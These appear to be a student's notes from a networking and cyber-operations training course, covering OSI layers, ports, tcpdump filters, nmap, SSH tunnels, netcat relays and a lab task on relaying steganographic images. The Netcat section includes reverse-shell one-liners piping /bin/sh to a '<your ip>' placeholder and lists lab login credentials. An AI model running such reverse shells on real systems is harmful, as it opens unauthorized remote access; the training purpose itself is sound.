# INFO
http://networking-ctfd-1.server.vta:8000/resources
DYMI-003-M

Google the Protocol RFC's

https://miro.com/app/board/o9J_klSqCSY=/

Student#: student9
Command: ssh student@10.50.39.61 -X
Password: password

IANA - RFC

---------------------------------------------------------------------------------------------------------------
# Layer 2
Mac Addr converter
Arp Poisioning 
Mac Spoofing 
Double tagging

EtherType 0x0800 - ipv4
          0x08DD - ipv6
          0x0806 - ARP
          0x8000 - Vlan Tag
          0x88A8 - Standard Double Tag
          0x9100 - Non-standard Double Tag
## Layer 2 Switching
Cisco Discovery Protocol (CDP)
Foundry Discovery Protocol (FDP)
Link Layer Discovery Protocol(LLDP)

PORT SECURITY
    -shutdown
    -restrict
    -protect







# Layer 3
TTL - Hop Limit
Protocol - Next Header
TTL-
     Linux   -64
     Windows -128
     Cisco   -255

IPv4 Auto Configuration
  - APIPA
  - RFC 3927
IPv6 auto configuration
  - SLAAC (StateLess Address Auto-configuration)
  - RFC 4862


## Layer 3 routing
Show ip route



# Layer 4
TCP FLAGS
          URG
          ACK
          PSH
          RST
          SYN
          FYN

# Layer 5
SOCKS 4/5 (TCP 1080)
PPTP (TCP 1723)
L2TP (TCP 1701)
SMB/CIFS (TCP 139/445 and UDP 137/138)

# Layer 6
Responsibilities
          Translation
          Formating
          Encoding (ASCII, EBCDIC, HEX, BASE64)
          Encryption (Symmetric or Asymmetric)
          Compression
          
# Layer 7
FTP (TCP 20/21)
SSH (TCP 22)
Telnet (TCP 23)
SMTP (TCP 25)
TACACS (TCP 49) Simple/Extended
HTTP(s) (TCP 80/443)
POP (TCP 110)
IMAP (TCP 143)
RDP (TCP 3389)
DNS (query/response) (TCP/UDP 53)
DHCP (UDP 67/68)
TFTP (UDP 69)
NTP (UDP 123)
SNMP (UDP 161/162)
RADIUS (UDP 1645/1646 and 1812/1813)
RTP (UDP any above 1023)



# Cap
sudo tcpdump -D
sudo tcpdump -XXvv --hex and ascii and verbose {-w} some.pcap 
sudo tcpdump -r some.pcap --read pcap
sudo tcpdump port 80 || 22


# BPF
tcpdump {A} [B:C] {D} {E} {F} {G}

        A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
        B = Header Byte offset
        C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
        D = optional: Bitwise mask (&)
        E = Operator (= | == | > | < | <= | >= | != | () | << | >>)
        F = Result of Expresion
        G = optional: Logical Operator (&& ||) to bridge expressions

Example:
tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 && tcp[2:2] != 23)'

Bitwise Masking
    To filter down to the bit(s) and not just the byte.
ip[0] & 0x0F > 0x05

sudo tcpdump 'ip[8] <= 64 || ip6[7] <= 64' -r /home/activity_resources/pcaps/BPFCheck.pcap | wc -l


# Network Programming
socket.socket([*family*[,*type*[*proto*]]])

    family constants should be: AF_INET (default), AF_INET6, AF_UNIX

    type constants should be: SOCK_STREAM (default), SOCK_DGRAM, SOCK_RAW

    proto constants should be: 0 (default), IPPROTO_RAW



# Recon
WHOIS - Domain name to Ip & Info

**Key Ports* 
nmap -Pn 10.10.0.40 -p 21,22,23,80

NetCat for banner grabbing!!!

ip neigh | grep REACH -- finding local machines

**getting webpages//files**
curl 
wget -r~recursive
ftp

# router commands 
show int 


# Data Transfer 
### TFTP
          -UDP
          -small
          -insecure
          -no terminal communication
          
### FTP
          -TCP
          -control 21 Data 20
          -insecure by default
          -has dir services
          -anonymous login

### SFTP             
          -TCP 22
          -ftp + ssh
          -terminal
          
### FTPS
          -TCP 443
          -adds SSL/TLS
          -teminal
'''
nc 10.50.30.212 21 **banner grab**
          ftp 10.50.30.212
                    Anonymous
          Passive
          **if not working, possibly using public ip so data channel is built to the middle man**
          **May be useful for bypassing firewalls**
'''
 ### remember wget! wget -r ftp://10.0.0.104 ---specify port
 
 
### SCP
          -tcp 22   Uses -P to specify alt port
          -non interactive
          
          Download from remote to local
 scp student@172.16.82.106:secretstuff.txt /home/student        
          Upload to remote from local
  scp secretstuff.txt student@172.16.82.106:/home/student        
          copy from remote to remote                                  **-3 uses me as the middle man**
    scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student      

          **TUNNEL**
ssh student@172.16.82.106 -L 1111:localhost:22 -NT

          Download from remote to local
scp -P 1111 student@localhost:secretstuff.txt /home/student

          Upload to remote from local
scp -P 1111 secretstuff.txt student@localhost:/home/student          


### Netcat
          Client to listener
Client (sends file): nc 10.2.0.2 9001 < file.txt
Listener (receive file): nc -l -p 9001 > newfile.txt

          Listener to Client
Listener (sends file): nc -l -p 9001 < file.txt
Client (receive file): nc 10.2.0.2 9001 > newfile.txt

mknod mypipe p
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
nc -l -p 9002 < infile.txt
nc -l -p 9001 > outfile.txt

          Useful if host doesnt have netcat
nc -l -p 1111 > file.txt

cat file.txt > /dev/tcp/10.2.0.2/1111

          **Reverse shell using NETCAT**
          When shelled into the remote host using -c :

nc -c /bin/sh <your ip> <any unfiltered port>

          You could even pipe BASH through NETCAT.

/bin/sh | nc <your ip> <any unfiltered port>

          Then listen for the shell.

nc -l -p <same unfiltered port> -vvv

          You can also listen using the -e with NETCAT.

nc -l -p <any unfiltered port> -e /bin/bash


## Pipes 
mkfifo APIPE          **three seprate machines**
nc -lp 3334 > APIPE | nc 10.50.34.84 12009 < APIPE
nc 10.0.0.101 3334 < newsecret.file
nc -lp 12009 

          
### EXAMP
nc -lp 1234 > piper | nc 10.50.39.61 5432 < piper         
nc 172.16.82.115 9876 > piper | nc 10.50.39.61 5432 < piper

PHRASE 1--I just invent. Then I wait until man comes around to needing what I have invented
PHRASE 2--Computers have lots of memory but no imagination
PHRASE 3--Hardware: The parts of a computer system that can be kicked
PHRASE 4--Technology makes it possible for people to gain control over everything, except over technology          
          
TASK 1
Task 1 Netcat Relay

Objective: You have been provided intel in regards to colecting key intelligence and sensitive data from Donovian Cyberspace, move and redirect all data back to your INTERNET-HOST. A Donovian Insider has stashed important information in the form of JPG images on T2. Each JPG image contains a piece of the message in the form of Steganography. Utilizing Netcat relays, you will use the designated RELAY to transfer the JPG images to your INTERNET-HOST. Once the images are downloaded you will use a command-line tool called steghide to extract the message.

Utilize the targets T1, T2, and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:

    The Donovian Insider provided a image called 1steg.jpg on T2 and is trying to connect to RELAY on TCP port 1234 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.

    The Donovian Insider provided a image called 2steg.jpg on T2 and is trying to connect to RELAY on TCP port 4321 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.

    The Donovian Insider provided a image called 3steg.jpg on T2 listening for a connection from RELAY on TCP port 6789. Establish a Netcat relay on RELAY to make this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.

    The Donovian Insider provided a image called 4steg.jpg on T2 listening for a connection from RELAY on TCP port 9876. Establish a Netcat relay on RELAY to make this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.

    Use the syntax: steghide extract -sf [image name] to extract the hidden message. Use password when prompted for a passphrase.
          

          
          
Task 1

T1
Hostname: INTERNET_HOST
External IP: 10.50.XXX.XXX (ALREADY PROVIDED) Internal IP: 10.10.0.40 (ALREADY PROVIDED) (accessed via FLOAT IP)
creds: (ALREADY PROVIDED)
Action: Successfully transfer file data between hosts via Netcat

T2
Hostname: BLUE_HOST-4
IP: 172.16.82.115
creds: (NONE)
Action: Successfully transfer files from this host using Netcat

RELAY
Hostname: BLUE_INT_DMZ_HOST-1
IP: 172.16.40.10
creds: (ALREADY PROVIDED)
Action: Successfully transfer file data between hosts via Netcat




